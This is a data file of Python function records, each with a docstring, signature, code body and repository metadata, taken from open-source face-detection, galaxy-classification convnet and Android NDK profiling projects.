{"docstring": "\"\"\"Parse input arguments.\"\"\"\n", "func_signal": "def parse_args():\n", "code": "parser = argparse.ArgumentParser(description='Compress a Fast R-CNN network')\nparser.add_argument('--def', dest='prototxt',\n                    help='prototxt file defining the uncompressed network',\n                    default=None, type=str)\nparser.add_argument('--def-svd', dest='prototxt_svd',\n                    help='prototxt file defining the SVD compressed network',\n                    default=None, type=str)\nparser.add_argument('--net', dest='caffemodel',\n                    help='model to compress',\n                    default=None, type=str)\n\nif len(sys.argv) == 1:\n    parser.print_help()\n    sys.exit(1)\n\nargs = parser.parse_args()\nreturn args", "path": "tools\\compress_net.py", "repo_name": "playerkk/face-py-faster-rcnn", "stars": 378, "license": "mit", "language": "python", "size": 631}
{"docstring": "\"\"\"Draw detected bounding boxes.\"\"\"\n", "func_signal": "def vis_detections(im, class_name, dets, thresh=0.5):\n", "code": "inds = np.where(dets[:, -1] >= thresh)[0]\nif len(inds) == 0:\n    return\n\nim = im[:, :, (2, 1, 0)]\nfig, ax = plt.subplots(figsize=(12, 12))\nax.imshow(im, aspect='equal')\nfor i in inds:\n    bbox = dets[i, :4]\n    score = dets[i, -1]\n\n    ax.add_patch(\n        plt.Rectangle((bbox[0], bbox[1]),\n                      bbox[2] - bbox[0],\n                      bbox[3] - bbox[1], fill=False,\n                      edgecolor='red', linewidth=3.5)\n        )\n    ax.text(bbox[0], bbox[1] - 2,\n            '{:s} {:.3f}'.format(class_name, score),\n            bbox=dict(facecolor='blue', alpha=0.5),\n            fontsize=14, color='white')\n\nax.set_title(('{} detections with '\n              'p({} | box) >= {:.1f}').format(class_name, class_name,\n                                              thresh),\n              fontsize=14)\nplt.axis('off')\nplt.tight_layout()\nplt.draw()\nplt.show()", "path": "tools\\run_face_detection_on_fddb.py", "repo_name": "playerkk/face-py-faster-rcnn", "stars": 378, "license": "mit", "language": "python", "size": 631}
{"docstring": "\"\"\"\nEnumerate a set of anchors for each aspect ratio wrt an anchor.\n\"\"\"\n\n", "func_signal": "def _ratio_enum(anchor, ratios):\n", "code": "w, h, x_ctr, y_ctr = _whctrs(anchor)\nsize = w * h\nsize_ratios = size / ratios\nws = np.round(np.sqrt(size_ratios))\nhs = np.round(ws * ratios)\nanchors = _mkanchors(ws, hs, x_ctr, y_ctr)\nreturn anchors", "path": "lib\\rpn\\generate_anchors.py", "repo_name": "playerkk/face-py-faster-rcnn", "stars": 378, "license": "mit", "language": "python", "size": 631}
{"docstring": "\"\"\"\nEnumerate a set of anchors for each scale wrt an anchor.\n\"\"\"\n\n", "func_signal": "def _scale_enum(anchor, scales):\n", "code": "w, h, x_ctr, y_ctr = _whctrs(anchor)\nws = w * scales\nhs = h * scales\nanchors = _mkanchors(ws, hs, x_ctr, y_ctr)\nreturn anchors", "path": "lib\\rpn\\generate_anchors.py", "repo_name": "playerkk/face-py-faster-rcnn", "stars": 378, "license": "mit", "language": "python", "size": 631}
{"docstring": "\"\"\"Dispatch to either CPU or GPU NMS implementations.\"\"\"\n\n", "func_signal": "def nms(dets, thresh, force_cpu=False):\n", "code": "if dets.shape[0] == 0:\n    return []\nif cfg.USE_GPU_NMS and not force_cpu:\n    return gpu_nms(dets, thresh, device_id=cfg.GPU_ID)\nelse:\n    return cpu_nms(dets, thresh)", "path": "lib\\fast_rcnn\\nms_wrapper.py", "repo_name": "playerkk/face-py-faster-rcnn", "stars": 378, "license": "mit", "language": "python", "size": 631}
{"docstring": "\"\"\"Parse input arguments.\"\"\"\n", "func_signal": "def parse_args():\n", "code": "parser = argparse.ArgumentParser(description='Face Detection using Faster R-CNN')\nparser.add_argument('--gpu', dest='gpu_id', help='GPU device id to use [0]',\n          default=0, type=int)\nparser.add_argument('--cpu', dest='cpu_mode',\n          help='Use CPU mode (overrides --gpu)',\n          action='store_true')\nparser.add_argument('--net', dest='demo_net', help='Network to use [vgg16]',\n          choices=NETS.keys(), default='vgg16')\n\nargs = parser.parse_args()\n\nreturn args", "path": "tools\\run_face_detection_on_fddb.py", "repo_name": "playerkk/face-py-faster-rcnn", "stars": 378, "license": "mit", "language": "python", "size": 631}
{"docstring": "\"\"\"\nParse input arguments\n\"\"\"\n", "func_signal": "def parse_args():\n", "code": "parser = argparse.ArgumentParser(description='Train a Fast R-CNN network')\nparser.add_argument('--gpu', dest='gpu_id',\n                    help='GPU device id to use [0]',\n                    default=0, type=int)\nparser.add_argument('--solver', dest='solver',\n                    help='solver prototxt',\n                    default=None, type=str)\nparser.add_argument('--iters', dest='max_iters',\n                    help='number of iterations to train',\n                    default=40000, type=int)\nparser.add_argument('--weights', dest='pretrained_model',\n                    help='initialize with pretrained model weights',\n                    default=None, type=str)\nparser.add_argument('--cfg', dest='cfg_file',\n                    help='optional config file',\n                    default=None, type=str)\nparser.add_argument('--imdb', dest='imdb_name',\n                    help='dataset to train on',\n                    default='voc_2007_trainval', type=str)\nparser.add_argument('--rand', dest='randomize',\n                    help='randomize (do not use a fixed seed)',\n                    action='store_true')\nparser.add_argument('--set', dest='set_cfgs',\n                    help='set config keys', default=None,\n                    nargs=argparse.REMAINDER)\n\nif len(sys.argv) == 1:\n    parser.print_help()\n    sys.exit(1)\n\nargs = parser.parse_args()\nreturn args", "path": "tools\\train_net.py", "repo_name": "playerkk/face-py-faster-rcnn", "stars": 378, "license": "mit", "language": "python", "size": 631}
{"docstring": "\"\"\"Locate the CUDA environment on the system\n\nReturns a dict with keys 'home', 'nvcc', 'include', and 'lib64'\nand values giving the absolute path to each directory.\n\nStarts by looking for the CUDAHOME env variable. If not found, everything\nis based on finding 'nvcc' in the PATH.\n\"\"\"\n\n# first check if the CUDAHOME env variable is in use\n", "func_signal": "def locate_cuda():\n", "code": "if 'CUDAHOME' in os.environ:\n    home = os.environ['CUDAHOME']\n    nvcc = pjoin(home, 'bin', 'nvcc')\nelse:\n    # otherwise, search the PATH for NVCC\n    default_path = pjoin(os.sep, 'usr', 'local', 'cuda', 'bin')\n    nvcc = find_in_path('nvcc', os.environ['PATH'] + os.pathsep + default_path)\n    if nvcc is None:\n        raise EnvironmentError('The nvcc binary could not be '\n            'located in your $PATH. Either add it to your path, or set $CUDAHOME')\n    home = os.path.dirname(os.path.dirname(nvcc))\n\ncudaconfig = {'home':home, 'nvcc':nvcc,\n              'include': pjoin(home, 'include'),\n              'lib64': pjoin(home, 'lib64')}\nfor k, v in cudaconfig.iteritems():\n    if not os.path.exists(v):\n        raise EnvironmentError('The CUDA %s path could not be located in %s' % (k, v))\n\nreturn cudaconfig", "path": "lib\\setup.py", "repo_name": "playerkk/face-py-faster-rcnn", "stars": 378, "license": "mit", "language": "python", "size": 631}
{"docstring": "# output_width = (self.input_shape[1] - self.filter_size + self.stride) // self.stride\n", "func_signal": "def get_output_shape(self):\n", "code": "output_width = self.input_shape[1] // self.stride # because it's a circular convolution, this dimension is just divided by the stride.\noutput_height = (self.input_shape[2] - self.filter_size + self.stride) // self.stride # in this direction it's still valid though.       \noutput_shape = (self.n_filters, output_width, output_height, self.mb_size)\nreturn output_shape", "path": "cc_layers.py", "repo_name": "benanne/kaggle-galaxies", "stars": 487, "license": "bsd-3-clause", "language": "python", "size": 15579}
{"docstring": "\"\"\"\nthis generates the training data in order, for postprocessing. Do not use this for actual training.\n\"\"\"\n", "func_signal": "def create_train_gen():\n", "code": "data_gen_train = ra.realtime_fixed_augmented_data_gen(train_indices, 'train',\n    ds_transforms=ds_transforms, chunk_size=CHUNK_SIZE, target_sizes=input_sizes)\nreturn load_data.buffered_gen_mp(data_gen_train, buffer_size=GEN_BUFFER_SIZE)", "path": "try_convnet_cc_multirotflip_3x69r45_maxout2048.py", "repo_name": "benanne/kaggle-galaxies", "stars": 487, "license": "bsd-3-clause", "language": "python", "size": 15579}
{"docstring": "## this could probably be a lot easier... meh.\n# downsampling afterwards is recommended\n", "func_signal": "def im_translate(img, shift_x, shift_y):\n", "code": "translate_img = np.zeros_like(img, dtype=img.dtype)\n\nif shift_x >= 0:\n    slice_x_src = slice(None, img.shape[0] - shift_x, None)\n    slice_x_tgt = slice(shift_x, None, None)\nelse:\n    slice_x_src = slice(- shift_x, None, None)\n    slice_x_tgt = slice(None, img.shape[0] + shift_x, None)\n\nif shift_y >= 0:\n    slice_y_src = slice(None, img.shape[1] - shift_y, None)\n    slice_y_tgt = slice(shift_y, None, None)\nelse:\n    slice_y_src = slice(- shift_y, None, None)\n    slice_y_tgt = slice(None, img.shape[1] + shift_y, None)\n\ntranslate_img[slice_x_tgt, slice_y_tgt] = img[slice_x_src, slice_y_src]\n\nreturn translate_img", "path": "load_data.py", "repo_name": "benanne/kaggle-galaxies", "stars": 487, "license": "bsd-3-clause", "language": "python", "size": 15579}
{"docstring": "\"\"\"\nGenerator that runs a slow source generator in a separate process.\nbuffer_size: the maximal number of items to pre-generate (length of the buffer)\n\"\"\"\n", "func_signal": "def buffered_gen_mp(source_gen, buffer_size=2, sleep_time=1):\n", "code": "buffer = mp.Queue(maxsize=buffer_size)\n\ndef _buffered_generation_process(source_gen, buffer):\n    while True:\n        # we block here when the buffer is full. There's no point in generating more data\n        # when the buffer is full, it only causes extra memory usage and effectively\n        # increases the buffer size by one.\n        while buffer.full():\n            # print \"DEBUG: buffer is full, waiting to generate more data.\"\n            time.sleep(sleep_time)\n\n        try:\n            data = source_gen.next()\n        except StopIteration:\n            # print \"DEBUG: OUT OF DATA, CLOSING BUFFER\"\n            buffer.close() # signal that we're done putting data in the buffer\n            break\n\n        buffer.put(data)\n\nprocess = mp.Process(target=_buffered_generation_process, args=(source_gen, buffer))\nprocess.start()\n\nwhile True:\n    try:\n        # yield buffer.get()\n        # just blocking on buffer.get() here creates a problem: when get() is called and the buffer\n        # is empty, this blocks. Subsequently closing the buffer does NOT stop this block.\n        # so the only solution is to periodically time out and try again. That way we'll pick up\n        # on the 'close' signal.\n        try:\n            yield buffer.get(True, timeout=sleep_time)\n        except Queue.Empty:\n            if not process.is_alive():\n                break # no more data is going to come. This is a workaround because the buffer.close() signal does not seem to be reliable.\n\n            # print \"DEBUG: queue is empty, waiting...\"\n            pass # ignore this, just try again.\n\n    except IOError: # if the buffer has been closed, calling get() on it will raise IOError.\n        # this means that we're done iterating.\n        # print \"DEBUG: buffer closed, stopping.\"\n        break", "path": "load_data.py", "repo_name": "benanne/kaggle-galaxies", "stars": 487, "license": "bsd-3-clause", "language": "python", "size": 15579}
{"docstring": "\"\"\"\nthis generates the training data in order, for postprocessing. Do not use this for actual training.\n\"\"\"\n", "func_signal": "def create_train_gen():\n", "code": "data_gen_train = ra.realtime_fixed_augmented_data_gen(train_indices, 'train',\n    ds_transforms=ds_transforms, chunk_size=CHUNK_SIZE, target_sizes=input_sizes)\nreturn load_data.buffered_gen_mp(data_gen_train, buffer_size=GEN_BUFFER_SIZE)", "path": "try_convnet_cc_multirotflip_3x69r45_shareddense512.py", "repo_name": "benanne/kaggle-galaxies", "stars": 487, "license": "bsd-3-clause", "language": "python", "size": 15579}
{"docstring": "\"\"\"\nthis generates the training data in order, for postprocessing. Do not use this for actual training.\n\"\"\"\n", "func_signal": "def create_train_gen():\n", "code": "data_gen_train = ra.realtime_fixed_augmented_data_gen(train_indices, 'train',\n    ds_transforms=ds_transforms, chunk_size=CHUNK_SIZE, target_sizes=input_sizes)\nreturn load_data.buffered_gen_mp(data_gen_train, buffer_size=GEN_BUFFER_SIZE)", "path": "try_convnet_cc_multirotflip_3x69r45_maxout2048_extradense_dup3.py", "repo_name": "benanne/kaggle-galaxies", "stars": 487, "license": "bsd-3-clause", "language": "python", "size": 15579}
{"docstring": "\"\"\"\nOnly the valid border mode is supported.\n\nn_filters should be a multiple of 16\n\"\"\"\n", "func_signal": "def __init__(self, input_layer, n_filters, filter_size, weights_std, init_bias_value, stride=1, nonlinearity=layers.rectify, dropout=0., partial_sum=None, pad=0, untie_biases=False):\n", "code": "self.input_layer = input_layer\nself.n_filters = n_filters\nself.filter_size = filter_size\nself.weights_std = np.float32(weights_std)\nself.init_bias_value = np.float32(init_bias_value)\nself.stride = stride\nself.nonlinearity = nonlinearity\nself.dropout = dropout\nself.partial_sum = partial_sum\nself.pad = pad\nself.untie_biases = untie_biases\n# if untie_biases == True, each position in the output map has its own bias (as opposed to having the same bias everywhere for a given filter)\nself.mb_size = self.input_layer.mb_size\n\nself.input_shape = self.input_layer.get_output_shape()\n\nself.filter_shape = (self.input_shape[0], filter_size, filter_size, n_filters)\n\nself.W = layers.shared_single(4) # theano.shared(np.random.randn(*self.filter_shape).astype(np.float32) * self.weights_std)\n\nif self.untie_biases:\n    self.b = layers.shared_single(3)\nelse:\n    self.b = layers.shared_single(1) # theano.shared(np.ones(n_filters).astype(np.float32) * self.init_bias_value)\n\nself.params = [self.W, self.b]\nself.bias_params = [self.b]\nself.reset_params()\n\nself.filter_acts_op = FilterActs(stride=self.stride, partial_sum=self.partial_sum, pad=self.pad)", "path": "cc_layers.py", "repo_name": "benanne/kaggle-galaxies", "stars": 487, "license": "bsd-3-clause", "language": "python", "size": 15579}
{"docstring": "\"\"\"\nthis generates the training data in order, for postprocessing. Do not use this for actual training.\n\"\"\"\n", "func_signal": "def create_train_gen():\n", "code": "data_gen_train = ra.realtime_fixed_augmented_data_gen(train_indices, 'train',\n    ds_transforms=ds_transforms, chunk_size=CHUNK_SIZE, target_sizes=input_sizes,\n    processor_class=ra.LoadAndProcessFixedPysexCenteringRescaling)\nreturn load_data.buffered_gen_mp(data_gen_train, buffer_size=GEN_BUFFER_SIZE)", "path": "try_convnet_cc_multirotflip_3x69r45_8433n_maxout2048_pysex.py", "repo_name": "benanne/kaggle-galaxies", "stars": 487, "license": "bsd-3-clause", "language": "python", "size": 15579}
{"docstring": "\"\"\"\nthis generates the training data in order, for postprocessing. Do not use this for actual training.\n\"\"\"\n", "func_signal": "def create_train_gen():\n", "code": "data_gen_train = ra.realtime_fixed_augmented_data_gen(train_indices, 'train',\n    ds_transforms=ds_transforms, chunk_size=CHUNK_SIZE, target_sizes=input_sizes)\nreturn load_data.buffered_gen_mp(data_gen_train, buffer_size=GEN_BUFFER_SIZE)", "path": "try_convnet_cc_multirotflip_3x69r45_8433n_maxout2048.py", "repo_name": "benanne/kaggle-galaxies", "stars": 487, "license": "bsd-3-clause", "language": "python", "size": 15579}
{"docstring": "\"\"\"\nperform fast augmentation that can be applied directly to the chunks in realtime.\n\"\"\"\n", "func_signal": "def post_augment_chunk(data_list):\n", "code": "chunk_size = data_list[0].shape[0]\n\nrotations = np.random.randint(0, 4, chunk_size)\nflip_h = np.random.randint(0, 2, chunk_size).astype('bool')\nflip_v = np.random.randint(0, 2, chunk_size).astype('bool')\n\nfor x in data_list:\n    if x.ndim <= 3:\n        continue # don't apply the transformations to anything that isn't an image\n\n    for k in xrange(chunk_size):\n        x_k = np.rot90(x[k], k=rotations[k])\n\n        if flip_h[k]:\n            x_k = x_k[::-1]\n\n        if flip_v[k]:\n            x_k = x_k[:, ::-1]\n\n        x[k] = x_k\n\nreturn data_list", "path": "load_data.py", "repo_name": "benanne/kaggle-galaxies", "stars": 487, "license": "bsd-3-clause", "language": "python", "size": 15579}
{"docstring": "\"\"\"\nThe Krizhevskhy max pooling layer only supports square input. This function provides\na workaround that uses Theano's own max pooling op, flanked by two shuffling operations:\nc01b to bc01 before pooling, and bc01 to c01b afterwards.\n\"\"\"\n", "func_signal": "def shuffle_pool_unshuffle(input_layer, *args, **kwargs):\n", "code": "l_bc01 = ShuffleC01BToBC01Layer(input_layer)\nl_pool = layers.Pooling2DLayer(l_bc01, *args, **kwargs)\nl_c01b = ShuffleBC01ToC01BLayer(l_pool)\n\nreturn l_c01b", "path": "cc_layers.py", "repo_name": "benanne/kaggle-galaxies", "stars": 487, "license": "bsd-3-clause", "language": "python", "size": 15579}
{"docstring": "\"\"\"\nbased on matlab code by Guanglei Xiong, see http://www.mathworks.com/matlabcentral/fileexchange/8303-local-normalization\nassuming chunk.shape == (num_examples, x, y, channels)\n\n'rescale' is an additional rescaling constant to get the variance of the result in the 'right' range.\n\"\"\"\n", "func_signal": "def chunk_lcn(chunk, sigma_mean, sigma_std, std_bias=0.0, rescale=1.0):\n", "code": "means = np.zeros(chunk.shape, dtype=chunk.dtype)\nfor k in xrange(len(chunk)):\n    means[k] = skimage.filter.gaussian_filter(chunk[k], sigma_mean, multichannel=True)\n\nchunk = chunk - means # centering\ndel means # keep memory usage in check\n\nvariances = np.zeros(chunk.shape, dtype=chunk.dtype)\nchunk_squared = chunk**2\nfor k in xrange(len(chunk)):\n    variances[k] = skimage.filter.gaussian_filter(chunk_squared[k], sigma_std, multichannel=True)\n\nchunk = chunk / np.sqrt(variances + std_bias)\n\nreturn chunk / rescale\n\n# TODO: make this 100x faster lol. otherwise it's not usable.", "path": "load_data.py", "repo_name": "benanne/kaggle-galaxies", "stars": 487, "license": "bsd-3-clause", "language": "python", "size": 15579}
{"docstring": "\"\"\"\nthis generates the training data in order, for postprocessing. Do not use this for actual training.\n\"\"\"\n", "func_signal": "def create_train_gen():\n", "code": "data_gen_train = ra.realtime_fixed_augmented_data_gen(train_indices, 'train',\n    ds_transforms=ds_transforms, chunk_size=CHUNK_SIZE, target_sizes=input_sizes,\n    processor_class=ra.LoadAndProcessFixedPysexGen1CenteringRescaling)\nreturn load_data.buffered_gen_mp(data_gen_train, buffer_size=GEN_BUFFER_SIZE)", "path": "try_convnet_cc_multirotflip_3x69r45_maxout2048_extradense_pysexgen1_dup2.py", "repo_name": "benanne/kaggle-galaxies", "stars": 487, "license": "bsd-3-clause", "language": "python", "size": 15579}
{"docstring": "\"\"\"\nbased on matlab code by Guanglei Xiong, see http://www.mathworks.com/matlabcentral/fileexchange/8303-local-normalization\n\"\"\"\n", "func_signal": "def im_lcn(img, sigma_mean, sigma_std):\n", "code": "means = ndimage.gaussian_filter(img, sigma_mean)\nimg_centered = img - means\nstds = np.sqrt(ndimage.gaussian_filter(img_centered**2, sigma_std))\nreturn img_centered / stds", "path": "load_data.py", "repo_name": "benanne/kaggle-galaxies", "stars": 487, "license": "bsd-3-clause", "language": "python", "size": 15579}
{"docstring": "\"\"\"\nspecify images_gen(cycle(list(train_ids))) as the ids_gen to loop through the training set indefinitely in random order.\n\nThe shape parameter is (chunk_size, imsize1, imsize2, ...)\nSo the size of the resulting images needs to be known in advance for efficiency reasons.\n\"\"\"\n", "func_signal": "def chunks_gen(images_gen, shape=(100, 424, 424, 3)):\n", "code": "chunk = np.zeros(shape)\nsize = shape[0]\n\nk = 0\nfor image in images_gen: \n    chunk[k] = image\n    k += 1\n\n    if k >= size:\n        yield chunk, size # return the chunk as well as its size (this is useful because the final chunk may be smaller)\n        chunk = np.zeros(shape)\n        k = 0\n\n# last bit of chunk\nif k > 0: # there is leftover data\n    yield chunk, k # the chunk is a fullsize array, but only the first k entries are valid.", "path": "load_data.py", "repo_name": "benanne/kaggle-galaxies", "stars": 487, "license": "bsd-3-clause", "language": "python", "size": 15579}
{"docstring": "\"\"\"\nLCN with an std bias to avoid noise amplification\n\"\"\"\n", "func_signal": "def im_lcn_bias(img, sigma_mean, sigma_std, std_bias):\n", "code": "means = ndimage.gaussian_filter(img, sigma_mean)\nimg_centered = img - means\nstds = np.sqrt(ndimage.gaussian_filter(img_centered**2, sigma_std) + std_bias)\nreturn img_centered / stds", "path": "load_data.py", "repo_name": "benanne/kaggle-galaxies", "stars": 487, "license": "bsd-3-clause", "language": "python", "size": 15579}
{"docstring": "\"\"\"\nThis is a convolution which is circular in the 0-direction, and valid in the 1-direction.\n\nn_filters should be a multiple of 16\n\"\"\"\n", "func_signal": "def __init__(self, input_layer, n_filters, filter_size, weights_std, init_bias_value, stride=1, nonlinearity=layers.rectify, dropout=0., partial_sum=None, untie_biases=False):\n", "code": "self.input_layer = input_layer\nself.n_filters = n_filters\nself.filter_size = filter_size\nself.weights_std = np.float32(weights_std)\nself.init_bias_value = np.float32(init_bias_value)\nself.stride = stride\nself.nonlinearity = nonlinearity\nself.dropout = dropout\nself.partial_sum = partial_sum\nself.untie_biases = untie_biases\n# if untie_biases == True, each position in the output map has its own bias (as opposed to having the same bias everywhere for a given filter)\nself.mb_size = self.input_layer.mb_size\n\nself.input_shape = self.input_layer.get_output_shape()\n\nself.filter_shape = (self.input_shape[0], filter_size, filter_size, n_filters)\n\nself.W = layers.shared_single(4) # theano.shared(np.random.randn(*self.filter_shape).astype(np.float32) * self.weights_std)\n\nif self.untie_biases:\n    self.b = layers.shared_single(3)\nelse:\n    self.b = layers.shared_single(1) # theano.shared(np.ones(n_filters).astype(np.float32) * self.init_bias_value)\n\nself.params = [self.W, self.b]\nself.bias_params = [self.b]\nself.reset_params()\n\nself.filter_acts_op = FilterActs(stride=self.stride, partial_sum=self.partial_sum)", "path": "cc_layers.py", "repo_name": "benanne/kaggle-galaxies", "stars": 487, "license": "bsd-3-clause", "language": "python", "size": 15579}
{"docstring": "\"\"\"\npool_size: the number of inputs to be pooled together.\n\"\"\"\n", "func_signal": "def __init__(self, input_layer, pool_size, epsilon=1e-12):\n", "code": "self.pool_size = pool_size\nself.epsilon = epsilon\nself.input_layer = input_layer\nself.input_shape = self.input_layer.get_output_shape()\nself.mb_size = self.input_layer.mb_size\n\nself.params = []\nself.bias_params = []", "path": "cc_layers.py", "repo_name": "benanne/kaggle-galaxies", "stars": 487, "license": "bsd-3-clause", "language": "python", "size": 15579}
{"docstring": "\"\"\"\nthis generates the training data in order, for postprocessing. Do not use this for actual training.\n\"\"\"\n", "func_signal": "def create_train_gen():\n", "code": "data_gen_train = ra.realtime_fixed_augmented_data_gen(train_indices, 'train',\n    ds_transforms=ds_transforms, chunk_size=CHUNK_SIZE, target_sizes=input_sizes)\nreturn load_data.buffered_gen_mp(data_gen_train, buffer_size=GEN_BUFFER_SIZE)", "path": "try_convnet_cc_multirotflip_3x69r45_8433n_maxout2048_extradense.py", "repo_name": "benanne/kaggle-galaxies", "stars": 487, "license": "bsd-3-clause", "language": "python", "size": 15579}
{"docstring": "\"\"\"\nthis generates the training data in order, for postprocessing. Do not use this for actual training.\n\"\"\"\n", "func_signal": "def create_train_gen():\n", "code": "data_gen_train = ra.realtime_fixed_augmented_data_gen(train_indices, 'train',\n    ds_transforms=ds_transforms, chunk_size=CHUNK_SIZE, target_sizes=input_sizes,\n    processor_class=ra.LoadAndProcessFixedPysexCenteringRescaling)\nreturn load_data.buffered_gen_mp(data_gen_train, buffer_size=GEN_BUFFER_SIZE)", "path": "try_convnet_cc_multirotflip_3x69r45_maxout2048_pysex.py", "repo_name": "benanne/kaggle-galaxies", "stars": 487, "license": "bsd-3-clause", "language": "python", "size": 15579}
{"docstring": "\"\"\"Initialize this instance.\n\nArgs:\n  read_file: File to read.\n  output_file: If this isn't None, data read from read_file will be written\n    to this file.\n\"\"\"\n", "func_signal": "def __init__(self, read_file, output_file):\n", "code": "super(ThreadedReader, self).__init__()\nself.read_file = read_file\nself.output_file = output_file\nself.read_lines = []", "path": "bin\\android_ndk_perf.py", "repo_name": "google/fplutil", "stars": 332, "license": "apache-2.0", "language": "python", "size": 13675}
{"docstring": "\"\"\"Find the path of the specified host binary.\n\nArgs:\n  name: The name of the binary to find.\n  adb_device: Device connected to the host, if this is None this function\n    will search for device specific binaries in the most recent API\n    directory.\n\nReturns:\n  The path of the binary.\n\nRaises:\n  BinaryNotFoundError: If the specified binary isn't found.\n\"\"\"\n", "func_signal": "def find_host_binary(name, adb_device=None):\n", "code": "exe_extensions = get_host_executable_extensions()\n\n# Get the set of compatible architectures for the current OS.\nsearch_paths = []\nos_name, architectures = get_host_os_name_architecture()\nos_dirs = ['-'.join((os_name, arch)) for arch in architectures]\n\n# Get the list of API levels to search.\napi_level_dir_prefix = 'android-'\napi_levels = []\nif adb_device:\n  api_levels = range(adb_device.get_api_level(), PERF_MIN_API_LEVEL - 1, -1)\nelse:\n  api_levels = sorted([\n      int(filename[len(api_level_dir_prefix):])\n      for filename in os.listdir(PERF_TOOLS_BIN_DIRECTORY) if\n      filename.startswith(api_level_dir_prefix)], reverse=True)\n\n# Build the list of OS specific search paths.\nos_paths = []\nfor api_level in api_levels:\n  for os_dir in os_dirs:\n    os_paths.append(os.path.join('%s%d' % (api_level_dir_prefix, api_level),\n                                 os_dir))\nsearch_paths.extend(os_paths)\n\n# Finally queue a search of the root directory of the host search path.\nsearch_paths.append('')\n\nsearched_paths = []\nfor arch_path in search_paths:\n  for search_path in HOST_BINARY_SEARCH_PATHS:\n    for exe_extension in exe_extensions:\n      binary_path = (os.path.join(search_path, arch_path, name) +\n                     exe_extension)\n      searched_paths.append(binary_path)\n      if os.path.exists(binary_path):\n        return binary_path\nraise BinaryNotFoundError('Unable to find host binary %s in %s' % (\n    name, os.linesep.join(searched_paths)))", "path": "bin\\android_ndk_perf.py", "repo_name": "google/fplutil", "stars": 332, "license": "apache-2.0", "language": "python", "size": 13675}
{"docstring": "\"\"\"Restore the signal handler associated with this instance.\"\"\"\n", "func_signal": "def release(self):\n", "code": "assert self.signal_handler\nsignal.signal(self.signal_number, self.signal_handler)\nself.signal_handler = None", "path": "bin\\android_ndk_perf.py", "repo_name": "google/fplutil", "stars": 332, "license": "apache-2.0", "language": "python", "size": 13675}
{"docstring": "\"\"\"Parse perf script -D output and generate a data structure with the output.\n\nArgs:\n  dump_output: Output of the perf script -D command to parse.\n  progress_display_max_value: Maximum value to display in the\n    progress display.\n\nReturns:\n  List of PerfRecordSample instances, one per recorded sample.  If samples\n  were recorded at a fixed frequency PerfRecordSample.period is fixed up\n  for each sample with the time delta between each sample in the trace.\n\"\"\"\n", "func_signal": "def process_perf_script_dump(dump_output, progress_display_max_value):\n", "code": "samples = []\nsample_data = None\nsample = None\nprogress_display = ProgressDisplay()\nlines = dump_output.splitlines()\nnum_lines = len(lines)\n# Parse lines\nfor line_number, line in enumerate(lines):\n  # This could take a while, so display the progress.\n  progress_display.update((float(line_number + 1) / num_lines) *\n                          progress_display_max_value)\n  # End of the stack trace?\n  if not line:\n    if sample:\n      if not sample.stack:\n        # PERF_TO_TRACING requires a stack trace for each event so\n        # mark all events without a stack trace as \"idle\" at the end of\n        # 32-bit address space, since it's likely the sample simply\n        # captured the perf interrupt handler.\n        sample.stack.append(PerfIp(0xffffffff, '[idle]', '([idle])'))\n      samples.append(sample)\n      sample = None\n      sample_data = None\n\n  # Aggregating stack for sample.\n  elif sample:\n    # This is a stack trace.\n    m = PERF_REPORT_STACK_RE.match(line)\n    if m:\n      groups = m.groupdict()\n      symbol = groups['symbol']\n      dso = groups['dso']\n      sample.stack.append(PerfIp(\n          int(groups['ip'], 16),\n          symbol if symbol.strip() else '[unknown]',\n          '([unknown])' if dso == '()' else dso))\n\n  # If a sample is being parsed, merge the report line and create a sample.\n  elif sample_data:\n    m = PERF_DUMP_EVENT_SAMPLE_REPORT_RE.match(line)\n    if m:\n      sample_data.update(m.groupdict())\n      sample = PerfRecordSample(\n          int(sample_data['file_offset'][2:], 16),\n          sample_data['perf_event_type'],\n          int(sample_data['pid']),\n          int(sample_data['tid']),\n          int(sample_data['ip'][2:], 16),\n          int(sample_data['period']),\n          sample_data['comm'],\n          float(sample_data['time']),\n          sample_data['event'])\n\n  # Searching the start of a new sample.\n  else:\n    m = PERF_DUMP_EVENT_SAMPLE_RE.match(line)\n    if m:\n      sample_data = m.groupdict()\n\n# If period is 1 across all samples, derive the sample period from the time\n# delta between samples.\nif samples and sum([s.period for s in samples]) == len(samples):\n  delta_times = [samples[i].time - samples[i - 1].time\n                 for i in range(1, len(samples))]\n  # There is no delta for the last sample so duplicate the previous sample\n  # period, assuming a fixed sampling frequency.\n  delta_times.append(delta_times[-1])\n  # Fix up sampling periods.\n  for sample, delta_time in zip(samples, delta_times):\n    sample.period = delta_time\nreturn samples", "path": "bin\\android_ndk_perf.py", "repo_name": "google/fplutil", "stars": 332, "license": "apache-2.0", "language": "python", "size": 13675}
{"docstring": "\"\"\"Find the aapt (Android Asset Packaging Tool).\n\nReturns:\n  Path to aapt if successful, empty string otherwise.\n\"\"\"\n# NOTE: This is far from perfect since this will pick up the first instance\n# of aapt installed and not necessarily the newest version.\n# Use the path to the \"android\" SDK tool to determine the SDK path.\n", "func_signal": "def find_aapt():\n", "code": "build_tools_dir = os.path.realpath(\n    os.path.join(distutils.spawn.find_executable('android'),\n                 os.path.pardir, os.path.pardir, 'build-tools'))\nfor dirpath, unused_dirnames, filenames in os.walk(build_tools_dir):\n  for filename in filenames:\n    if os.path.splitext(filename)[0] == 'aapt':\n      return os.path.join(dirpath, filename)\nreturn ''", "path": "bin\\android_ndk_perf.py", "repo_name": "google/fplutil", "stars": 332, "license": "apache-2.0", "language": "python", "size": 13675}
{"docstring": "\"\"\"Parse time in each CPU frequency state.\n\nArgs:\n  string_to_parse: String to parse read from\n    /sys/devices/system/cpu/cpu[0-9]+/stats/time_in_state.\n\nReturns:\n  Dictionary of times_frequency dictionaries keyed by CPU index.  Where\n  times_frequency is a dictionary of times in usertime units keyed by\n  CPU frequency in Hz.  For each CPU with no available stats, an empty\n  times_frequency dictionary is present.\n\"\"\"\n", "func_signal": "def parse_cpufreq_stats_time_in_state(string_to_parse):\n", "code": "cpu_number_to_stats = {}\ntime_in_frequency = {}\nfor line in string_to_parse.splitlines():\n  m = SYS_DEVICES_CPU_NUMBER_RE.match(line)\n  if m:\n    time_in_frequency = {}\n    cpu_number_to_stats[int(m.groups()[0])] = time_in_frequency\n  else:\n    frequency, cpu_time = line.split()\n    time_in_frequency[int(frequency)] = int(cpu_time)\nreturn cpu_number_to_stats", "path": "bin\\android_ndk_perf.py", "repo_name": "google/fplutil", "stars": 332, "license": "apache-2.0", "language": "python", "size": 13675}
